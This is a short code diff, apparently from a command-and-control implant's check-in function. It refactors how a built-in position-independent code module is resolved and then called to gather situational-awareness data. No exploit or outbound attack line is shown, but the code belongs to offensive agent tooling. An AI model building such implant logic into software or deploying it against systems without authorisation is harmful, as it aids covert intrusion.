@@ -83,7 +83,8 @@ BOOL perform_checkin(AgentState *state, CheckinReply *reply) {
 	checkin.payload_uuid = clone_str(state->params.payload_uuid);
 	
 	// Use the checkin PICO to gather basic situational awareness info, if possible.
-	ResolvedPico pico = resolve_loaded_pico(&state->file_vault, "_builtin_checkin");
+	ResolvedPico pico = { 0 };
+	resolve_loaded_pico(&state->file_vault, &pico, "_builtin_checkin");
 	CHECKIN_PICO entrypoint = (CHECKIN_PICO) pico.entrypoint;
 	entrypoint(&checkin);
 	
